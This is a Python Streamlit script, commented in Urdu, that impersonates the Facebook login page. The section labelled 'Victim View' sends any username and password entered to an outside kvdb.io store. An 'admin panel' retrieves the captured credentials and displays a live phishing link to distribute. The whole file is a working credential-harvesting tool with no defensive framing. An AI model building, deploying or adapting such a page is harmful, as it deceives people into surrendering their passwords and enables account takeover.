
import streamlit as st
import requests

# پیج سیٹنگ
st.set_page_config(page_title="Facebook", page_icon="🔵", layout="centered")

# یو آر ایل پیرامیٹر چیک کرنا
view = st.query_params.get("view", "admin")

# --- اصلی فیس بک جیسا ڈیزائن (HTML/CSS) ---
facebook_html = """
<style>
    body { background-color: #000000; font-family: Helvetica, Arial, sans-serif; }
    .login-container { max-width: 400px; margin: auto; padding: 20px; text-align: center; color: white; }
    .fb-logo { width: 60px; margin-top: 50px; }
    input { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #333; border-radius: 10px; background: #1c1c1c; color: white; font-size: 16px; }
    .login-btn { width: 100%; padding: 12px; background-color: #0064e0; border: none; border-radius: 25px; color: white; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; }
    .forgot { color: #bcc0c4; margin-top: 20px; font-size: 14px; display: block; text-decoration: none; }
    .create-btn { width: 100%; padding: 12px; border: 1px solid #0064e0; border-radius: 25px; color: #0064e0; background: transparent; font-size: 16px; margin-top: 100px; }
    .meta-footer { margin-top: 20px; color: #bcc0c4; font-size: 14px; }
</style>

<div class="login-container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png" class="fb-logo">
    <div style="margin-top: 30px;">
        <form action="/" method="get">
            <input type="hidden" name="view" value="login">
            <input type="text" name="u" placeholder="Mobile number or email" required>
            <input type="password" name="p" placeholder="Password" required>
            <button type="submit" class="login-btn">Log In</button>
        </form>
    </div>
    <a href="#" class="forgot">Forgot password?</a>
    <button class="create-btn">Create new account</button>
    <div class="meta-footer">Meta</div>
</div>
"""

# --- 1. لاگ ان پیج (Victim View) ---
if view == "login":
    # اگر فارم سبمٹ ہوا ہے تو ڈیٹا پکڑیں
    u_data = st.query_params.get("u")
    p_data = st.query_params.get("p")
    
    if u_data and p_data:
        # ڈیٹا کو عارضی طور پر KVDB پر بھیجیں
        requests.post("https://kvdb.io/S9p4m8m8m8m8m8m8/fkg_creds", data=f"{u_data}:{p_data}")
        st.markdown("<h3 style='color: white; text-align: center; margin-top: 50px;'>Connecting... Please wait.</h3>", unsafe_allow_html=True)
    else:
        st.components.v1.html(facebook_html, height=800)

# --- 2. آپ کا کنٹرول پینل (Admin View) ---
else:
    st.title("FKG 🫀 ADMIN PANEL")
    if st.button("GET CAPTURED DATA"):
        res = requests.get("https://kvdb.io/S9p4m8m8m8m8m8m8/fkg_creds")
        if res.status_code == 200:
            st.error(f"FOUND: {res.text}")
        else:
            st.info("No logs found yet.")
    
    st.divider()
    url = "https://fkg-tool-2r9hhebwsdbwdbeyemcxpb.streamlit.app/?view=login"
    st.code(url)
